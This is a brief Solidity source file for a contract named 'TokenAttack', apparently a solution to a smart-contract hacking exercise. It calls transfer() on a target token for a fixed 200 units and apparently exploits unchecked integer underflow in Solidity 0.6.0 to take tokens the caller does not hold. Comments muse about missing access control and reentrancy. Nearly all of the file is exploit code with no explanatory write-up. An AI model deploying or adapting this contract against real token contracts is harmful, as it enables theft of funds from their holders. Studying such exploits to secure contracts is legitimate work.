// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
//Dangeorus, in 0.6.0 uints can overflow

interface Token {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}
contract TokenAttack {

    address public contractToAttack;
    address public targetAddressToTransfer;

    
    constructor(address _contractToAttack, address _targetAddressToTransfer) public {
        contractToAttack = _contractToAttack;
        targetAddressToTransfer = _targetAddressToTransfer;
    }

    //No access control?
    //Maybe reentrancy?
    function transferAttack() public returns (bool) {
        uint256 value;
        //value = Token(contractToAttack).balanceOf(contractToAttack);
        value = 200;
        Token(contractToAttack).transfer(targetAddressToTransfer,value);
    }

    //No access control, you can check balance of everyone
}